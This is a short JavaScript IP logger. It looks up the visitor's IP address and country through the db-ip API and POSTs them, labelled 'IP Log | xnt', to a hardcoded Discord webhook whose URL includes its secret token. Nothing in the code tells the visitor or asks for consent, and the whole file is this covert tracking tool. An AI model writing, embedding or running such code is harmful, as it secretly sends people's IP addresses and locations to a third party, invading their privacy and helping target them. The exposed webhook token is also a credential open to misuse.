var webHookUrl = "https://discord.com/api/webhooks/1014612117699170304/rbgdYEglNKPpIl0-WN_tl2tPE9UMxLllmZXK95CxiPk9xghWVMCa7BGDXw_68XXnHgIO";

$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
  console.log(JSON.stringify(data, null, 2));
});

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://api.db-ip.com/v2/free/self');
    const data = await response.json();
    console.log(data);

    // Declaring variables
    var ip = data.ipAddress;
    var country = data.countryName;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log | xnt",
        avatar_url: "",
        content:    "**new ip address** \n" + 
		    "**:globe_with_meridians: IP Address:** \n" +
                    "" + ip + " \n \n" +
		    "**Country:** \n" +
		    "" + country + "``` ```"
    }

    postRequest.send(JSON.stringify(params));

}

request();
